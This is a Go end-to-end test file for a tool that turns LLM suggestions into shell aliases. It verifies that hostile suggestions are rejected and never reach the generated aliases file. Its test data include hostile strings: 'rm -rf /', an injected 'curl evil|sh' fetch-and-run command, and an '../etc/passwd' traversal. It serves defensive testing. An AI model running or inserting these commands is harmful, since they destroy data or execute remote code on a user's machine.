//go:build e2e

package e2e

import (
	"strings"
	"testing"

	"github.com/ntalmon/aka/test/e2e/fakellm"
)

// hostileNames must never appear in any generated file.
var hostileNames = []string{
	"rm -rf /",
	"foo; curl evil|sh",
	"../etc/passwd",
	"9lives",
	strings.Repeat("a", 200),
}

func hostileEnv(t *testing.T) *Env {
	t.Helper()
	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)
	env.LLM.Respond(fakellm.Hostile())
	return env
}

// Accept everything the hostile server offers, then assert none of the
// dangerous names made it into the generated files.
func TestHostileNamesAreRejected(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	aliasesSh := env.AliasesFile()
	for _, name := range hostileNames {
		if strings.Contains(aliasesSh, name) {
			t.Errorf("hostile name %q reached aliases.sh:\n%s", name, aliasesSh)
		}
	}
	for _, entry := range env.Installed() {
		for _, name := range hostileNames {
			if entry.Name == name {
				t.Errorf("hostile name %q reached installed.json", name)
			}
		}
	}
}

// The generated file must always be syntactically valid shell, whatever the LLM
// returns. This is the assertion that covers cases nobody enumerated.
func TestGeneratedFileIsAlwaysValidShell(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	for _, sh := range []string{"zsh", "bash"} {
		out, code := runCommand(t, env, sh, "-n", env.ShellPath("aliases.sh"))
		if code != 0 {
			t.Errorf("%s -n rejected the generated aliases.sh (exit %d)\n%s\n---\n%s",
				sh, code, out, env.AliasesFile())
		}
	}
}

// A function template containing an unbalanced brace must not escape the
// generated function body.
func TestFunctionBodyCannotBreakOut(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	if strings.Contains(env.AliasesFile(), "echo escaped") {
		t.Errorf("breakout template body was written verbatim:\n%s", env.AliasesFile())
	}
}

// aka must survive hostile input without crashing.
func TestHostileResponseExitsCleanly(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Expect("space toggle")
	c.Send(Left)
	c.Expect("Are you sure you want to go back")
	c.Send(Enter) // "No" — stay
	c.Expect("space toggle")
	c.Send(Esc)

	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d, want 0 on abort", code)
	}
}

// A malformed response must fail loudly and write nothing.
func TestMalformedResponseWritesNothing(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)
	env.LLM.Respond(fakellm.Malformed())

	out, code := env.Run("scan", "--history", "full", "--censor", "trust")
	if code == 0 {
		t.Fatalf("expected a non-zero exit for a malformed response\n%s", out)
	}
	if n := len(env.Installed()); n != 0 {
		t.Errorf("installed.json gained %d entries after a failed scan", n)
	}
}

// The halving retry loop in runScan: first request errors with a token limit,
// the second succeeds with roughly half the commands.
//
// *llm.ErrTokenLimit is produced only by the OpenAI-compatible provider path
// (internal/llm/openaicompat.go) — the Anthropic provider never returns it —
// so this must run against provider "groq", not the anthropic default used by
// seededEnv/hostileEnv elsewhere in this package.
func TestTokenLimitTriggersHalvingRetry(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	env.SeedRC(existingRC)
	env.SeedConfig(ConfigTOML{
		Provider: "groq", // only the OpenAI-compatible path yields ErrTokenLimit
		Model:    "llama-3.3-70b-versatile",
		APIKey:   "e2e-groq-key",
	})
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("init failed")
	}
	env.SeedHistory(realisticHistory()...)
	env.LLM.Respond(fakellm.TokenLimit(fakellm.Normal(workflowSuggestions()...)))

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("Token limit exceeded; retrying with")
	c.Expect("AKA FOUND")
	c.Send(Esc)
	_ = c.Wait()

	reqs := env.LLM.Requests()
	if len(reqs) != 2 {
		t.Fatalf("made %d requests, want 2 (initial + retry)", len(reqs))
	}
	if len(reqs[1].Body) >= len(reqs[0].Body) {
		t.Errorf("retry body (%d bytes) is not smaller than the first (%d bytes)",
			len(reqs[1].Body), len(reqs[0].Body))
	}
}

// Documented behaviour, not an endorsement: command substitution inside a
// function template passes validation today and is written to aliases.sh.
// aliases.ValidateFunctionTemplate (internal/aliases/aliases.go) rejects only
// a line-leading '}' — it has no opinion on `$(...)`, backticks, or anything
// else. The user reviews every suggestion before accepting, so this may be
// intended. Changing it is a decision for its own change — see the plan's
// Task 10 note.
func TestCommandSubstitutionInTemplateIsCurrentlyAccepted(t *testing.T) {
	t.Parallel()

	env := hostileEnv(t)
	acceptEverything(t, env)

	if !strings.Contains(env.AliasesFile(), "e2esubshell") {
		t.Skip("e2esubshell was not accepted; the validator may have been tightened — " +
			"if so, delete this test, it has served its purpose")
	}
}

// acceptEverything selects every suggestion in the review list and applies.
//
// reviewListModel (internal/ui/ui.go) caps the cursor at len(suggestions) —
// that final position is the "Apply & exit" row — and Space is a no-op once
// the cursor is on that row (isOnApply() guards the toggle). So a fixed loop
// of Space+Down pairs is safe to run for more iterations than there are
// suggestions: once every real row has been toggled and the cursor parks on
// the Apply row, further Space/Down pairs are harmless no-ops rather than
// scrolling past it. fakellm.Hostile() currently returns 9 suggestions;
// 20 iterations gives headroom for that to grow without this loop needing to
// know the exact count.
func acceptEverything(t *testing.T, env *Env) {
	t.Helper()

	c := env.Spawn("scan", "--history", "full", "--censor", "trust")
	c.Expect("AKA FOUND")
	c.Expect("space toggle")

	// Walk the list, toggling each row, until the apply row is reached.
	for i := 0; i < 20; i++ {
		c.Send(Space, Down)
	}
	c.ExpectRe(`Apply \d+ suggestion\(s\) & exit`)
	c.Send(Enter)

	// Applying may report zero accepted if everything was rejected, which is a
	// valid outcome for the hostile fixture.
	c.ExpectRe(`Applied \d+ alias\(es\)/function\(s\)!|No suggestions accepted\.|Skipped \(name conflicts\)`)
	_ = c.Wait()
}
